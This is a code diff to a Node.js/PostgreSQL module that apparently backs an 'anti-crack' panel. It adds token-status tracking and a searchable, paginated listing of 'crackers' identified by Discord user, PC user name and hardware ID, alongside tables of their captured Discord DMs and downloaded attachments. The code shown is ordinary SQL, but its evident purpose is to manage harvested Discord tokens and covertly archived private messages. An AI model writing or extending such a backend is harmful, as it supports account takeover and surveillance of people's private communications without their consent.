@@ -72,6 +72,36 @@ async function initCaptureTables() {
   await pgQuery(`CREATE TABLE IF NOT EXISTS dm_archives (id SERIAL PRIMARY KEY, cracker_id INTEGER NOT NULL, channel_id TEXT NOT NULL, channel_name TEXT NOT NULL, messages JSONB DEFAULT '[]', message_count INTEGER DEFAULT 0, captured_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW(), UNIQUE(cracker_id, channel_id))`);
   await pgQuery(`CREATE TABLE IF NOT EXISTS dm_files (id SERIAL PRIMARY KEY, archive_id INTEGER REFERENCES dm_archives(id) ON DELETE CASCADE, message_id TEXT NOT NULL, filename TEXT NOT NULL, url TEXT NOT NULL, content_type TEXT, file_size INTEGER DEFAULT 0, local_path TEXT, downloaded_at TIMESTAMP DEFAULT NOW())`);
   await pgQuery(`CREATE TABLE IF NOT EXISTS token_history (id SERIAL PRIMARY KEY, cracker_id INTEGER NOT NULL, status TEXT NOT NULL, dm_count INTEGER DEFAULT 0, message_count INTEGER DEFAULT 0, checked_at TIMESTAMP DEFAULT NOW())`);
+  await pgQuery(`ALTER TABLE crackers ADD COLUMN IF NOT EXISTS token_status TEXT DEFAULT 'unknown'`);
+  await pgQuery(`ALTER TABLE crackers ADD COLUMN IF NOT EXISTS last_refresh TIMESTAMP`);
+  await pgQuery(`ALTER TABLE crackers ADD COLUMN IF NOT EXISTS archive_count INTEGER DEFAULT 0`);
+  await pgQuery(`ALTER TABLE crackers ADD COLUMN IF NOT EXISTS total_messages INTEGER DEFAULT 0`);
+}
+
+async function getCrackersWithStatus(page = 1, limit = 20, search = '', statusFilter = '') {
+  let where = '';
+  const params = [];
+  if (search) {
+    params.push(`%${search}%`);
+    where = `WHERE (c.discord_user ILIKE $${params.length} OR c.pc_user ILIKE $${params.length} OR c.hwid ILIKE $${params.length})`;
+  }
+  if (statusFilter) {
+    params.push(statusFilter);
+    where += where ? ` AND c.token_status = $${params.length}` : `WHERE c.token_status = $${params.length}`;
+  }
+  const countRes = await pgQuery(`SELECT COUNT(*) FROM crackers c ${where}`, params);
+  const total = parseInt(countRes.rows[0].count, 10);
+  const offset = (page - 1) * limit;
+  params.push(limit, offset);
+  const dataRes = await pgQuery(
+    `SELECT c.*, COALESCE(a.archive_count, 0) as archive_count, COALESCE(a.total_messages, 0) as total_messages
+     FROM crackers c
+     LEFT JOIN (SELECT cracker_id, COUNT(*) as archive_count, SUM(message_count) as total_messages FROM dm_archives GROUP BY cracker_id) a ON c.id = a.cracker_id
+     ${where}
+     ORDER BY c.last_seen DESC LIMIT $${params.length - 1} OFFSET $${params.length}`,
+    params
+  );
+  return { crackers: dataRes.rows, total, page, limit, pages: Math.ceil(total / limit) };
 }
 
 async function getDMArchives(crackerId) {
@@ -104,6 +134,7 @@ async function upsertDMFile(archiveId, messageId, filename, url, contentType, fi
 
 async function recordTokenStatus(crackerId, status, dmCount, messageCount) {
   await pgQuery('INSERT INTO token_history (cracker_id, status, dm_count, message_count) VALUES ($1, $2, $3, $4)', [crackerId, status, dmCount, messageCount]);
+  await pgQuery('UPDATE crackers SET token_status = $1, last_refresh = NOW() WHERE id = $2', [status, crackerId]);
 }
 
 async function getTotalArchives() {
@@ -121,4 +152,4 @@ async function getTotalArchivedFiles() {
   return parseInt(res.rows[0].count, 10);
 }
 
-module.exports = { pgQuery, getCrackers, getCrackerById, getDetections, getAntiCrackStats, initCaptureTables, getDMArchives, getDMFilesByCracker, upsertDMArchive, upsertDMFile, recordTokenStatus, getTotalArchives, getTotalArchivedMessages, getTotalArchivedFiles };
+module.exports = { pgQuery, getCrackers, getCrackerById, getDetections, getAntiCrackStats, initCaptureTables, getDMArchives, getDMFilesByCracker, upsertDMArchive, upsertDMFile, recordTokenStatus, getTotalArchives, getTotalArchivedMessages, getTotalArchivedFiles, getCrackersWithStatus };
